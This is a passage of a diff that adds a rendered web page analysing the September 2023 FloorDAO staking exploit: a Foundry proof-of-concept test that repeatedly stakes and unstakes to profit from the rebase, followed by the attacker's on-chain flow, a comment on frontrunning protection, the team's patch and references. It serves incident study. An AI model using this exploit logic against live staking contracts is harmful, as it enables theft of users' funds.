+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">    </span>deal<span class="p">(</span><span class="kt">address</span><span class="p">(</span>floor<span class="p">),</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">),</span><span class="w"> </span><span class="m m-Decimal">100</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">9</span><span class="p">);</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">    </span>vm<span class="p">.</span>startPrank<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">));</span>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="w">    </span>floor<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>staking<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint256</span><span class="p">).</span>max<span class="p">);</span>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w">    </span>staking<span class="p">.</span>stake<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">),</span><span class="w"> </span><span class="m m-Decimal">100</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">9</span><span class="p">,</span><span class="w"> </span><span class="kt">true</span><span class="p">,</span><span class="w"> </span><span class="kt">true</span><span class="p">);</span><span class="w">  </span><span class="c1">// get sFloor</span>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="w">    </span>vm<span class="p">.</span>stopPrank<span class="p">();</span>
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="w">    </span>deal<span class="p">(</span><span class="kt">address</span><span class="p">(</span>floor<span class="p">),</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="err">100</span>_000<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">9</span><span class="p">);</span>
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">balanceAttacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>floor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="w">    </span>floor<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>staking<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint256</span><span class="p">).</span>max<span class="p">);</span>
+</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="w">    </span>sFloor<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>staking<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint256</span><span class="p">).</span>max<span class="p">);</span>
+</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="w">    </span>staking<span class="p">.</span>stake<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>balanceAttacker<span class="p">,</span><span class="w"> </span><span class="kt">false</span><span class="p">,</span><span class="w"> </span><span class="kt">true</span><span class="p">);</span><span class="w">  </span><span class="c1">// get sFloor</span>
+</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">gFloorBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>gFloor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="w">    </span>staking<span class="p">.</span>unstake<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>gFloorBalance<span class="p">,</span><span class="w"> </span><span class="kt">true</span><span class="p">,</span><span class="w"> </span><span class="kt">false</span><span class="p">);</span>
+</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="w">    </span>balanceAttacker<span class="w"> </span><span class="o">=</span><span class="w"> </span>floor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Finally attacker Floor&quot;</span><span class="p">,</span><span class="w"> </span>balanceAttacker<span class="p">,</span><span class="w"> </span>floor<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Finally 0x1234 sFloor&quot;</span><span class="p">,</span><span class="w"> </span>sFloor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">)),</span><span class="w"> </span>sFloor<span class="p">.</span>decimals<span class="p">());</span><span class="w"> </span><span class="c1">// same increased rate</span>
+</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>The results show that other users who have staked normally also have more sFloor tokens.</p>
+<p>Furthermore, because the Floor protocol has not been very active for a long time, the epoch has been lagging behind for quite some time. Therefore, this attack could have been executed much earlier. Attempting the attack at block 17068772 would yield approximately 53 ETH.</p>
+<h3 id="attack-flow">Attack Flow</h3>
+<p>Analyzing the entire attack process of the <a href="https://etherscan.io/address/0x4453aed57c23a50d887a42ad0cd14ff1b819c750">attacker's address</a>.</p>
+<p><img alt="Attack Flow" src="../../image/230905_FloorDAO.assets/1908.png" /></p>
+<p>First, at around 7:08 AM on September 5th, the attacker initiated the attack by depositing approximately 1 ETH through Tornado Cash.</p>
+<p><img alt="Attack Flow" src="../../image/230905_FloorDAO.assets/2010.png" /></p>
+<p>At 7:20 AM, the attacker created an <code>attackContract</code> for the attack. Five minutes later, they executed the contract, initiating the attack. Subsequently, the remaining ETH was transferred to the <a href="https://etherscan.io/address/0xd3b85111c974c350f95532e3f4210a41c4874bb6">profitAddress</a>.</p>
+<p><img alt="Attack Flow" src="../../image/230905_FloorDAO.assets/2121.png" /></p>
+<p>The profitAddress gradually withdrew all ETH funds through Tornado Cash, and the entire attack process took less than an hour.</p>
+<h2 id="misc">Misc</h2>
+<h3 id="frontrunning-protection">Frontrunning Protection</h3>
+<p>Upon simple decompilation of the <a href="https://library.dedaub.com/ethereum/address/0x6ce5a85cff4c70591da82de5eb91c3fa38b40595/decompiled">attackContract</a>, it appears that there were minimal measures in place to prevent frontrunning. The attack logic was essentially embedded in the code with only basic sender verification and the number of stake cycles as a call parameter. Additionally, profits are transferred to another address to avoid detection.</p>
+<p>The gas used in the transaction is not particularly high (although it is still considerably higher compared to other transactions within the block), indicating that the attacker may have been confident in using Flashbots for this attack. However, no relevant tags such as <code>MEV Transaction</code> or <code>Flashbots</code> were found on the <a href="https://etherscan.io/tx/0x1274b32d4dfacd2703ad032e8bd669a83f012dde9d27ed92e4e7da0387adafe4">etherscan page</a> of the transaction, making it unclear what exactly happened.</p>
+<h3 id="patch">Patch</h3>
+<p>Following the attack, the FloorDAO team chose to reduce the liquidity of the Uniswap Floor-WETH pool. They also set the distributor to 0 in the transaction <a href="https://etherscan.io/tx/0xcd976ac20998783f6c03a195821fbe83a988d5c94c8bcb8c2314f9c75991fa76">0xcd97</a>, disabling the rebase functionality of the staking contract. As a result, even if all Floor tokens were borrowed from the pool for staking, the <code>balance + transferAmount</code> during the <code>rebase</code> execution remained lower than the <code>staked</code> amount. This prevented any profits from being generated, effectively eliminating the possibility of further attacks.</p>
+<h2 id="reference">Reference</h2>
+<p><a href="https://docs.floor.xyz/v/en">FloorDAO-docs-v1</a></p>
+<p><a href="https://medium.com/floordao/floor-post-mortem-incident-summary-september-5-2023-e054a2d5afa4">Floor Post Mortem &amp; Incident Summary</a></p>
+<p><a href="https://github.com/OlympusDAO/olympus-contracts/issues/172">olympus-contracts: Incorrect distribute amount when stake triggers rebase</a></p>
+<p><a href="https://medium.com/@darumadao/introduce-the-warm-up-%EF%B8%8F-for-staking-2387de4dd48">Introduce the Warm-up for Staking</a></p>
+<p><a href="https://www.reddit.com/r/MagnetDAO/comments/rv8l9t/warmup_period_when_staking/">MagnetDAO_warmup_period_when_staking</a></p>
+<p><a href="https://ethereum.stackexchange.com/questions/115615/what-is-gons-in-olympus-finance">What is "gons" in Olympus Finance?</a></p>
+<p><a href="https://medium.com/@marcilgen_70414/rebasing-tokens-with-oracles-and-liquidity-mining-the-ampleforth-approach-as-a-precursor-to-fdec8f83a0bb">Rebasing Tokens with Oracles and Liquidity Mining: The Ampleforth Approach as a Precursor to OlympusDAO</a></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../230415_HundredFinance/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 230415-HundredFinance">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                230415-HundredFinance
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../230905_HeavensGate_JumpFarm_QuantumWN/" class="md-footer__link md-footer__link--next" aria-label="Next: 230905-HeavensGate-JumpFarm-QuantumWN">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                230905-HeavensGate-JumpFarm-QuantumWN
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.footer", "content.code.copy", "search.suggest", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../javascripts/katex.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/katex.min.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/contrib/auto-render.min.js"></script>
+      
+    
+  </body>
+</html>
